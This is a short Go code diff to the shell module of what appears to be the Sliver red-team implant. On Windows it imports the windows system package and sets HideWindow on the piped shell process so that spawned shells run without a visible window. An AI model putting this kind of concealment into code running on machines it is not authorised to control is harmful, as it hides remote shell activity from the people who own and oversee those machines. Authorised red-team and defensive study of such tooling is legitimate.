@@ -33,6 +33,10 @@ import (
 
 	"github.com/bishopfox/sliver/sliver/shell/pty"
 	// {{end}}
+
+	// {{if eq .GOOS "windows"}}
+	"golang.org/x/sys/windows"
+	// {{end}}
 )
 
 const (
@@ -73,6 +77,11 @@ func pipedShell(tunnelID uint64, command []string) *Shell {
 	var cmd *exec.Cmd
 	cmd = exec.Command(command[0], command[1:]...)
 
+	// {{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		HideWindow: true,
+	}
+	// {{end}}
 	stdin, _ := cmd.StdinPipe()
 	stdout, _ := cmd.StdoutPipe()
 	cmd.Start()
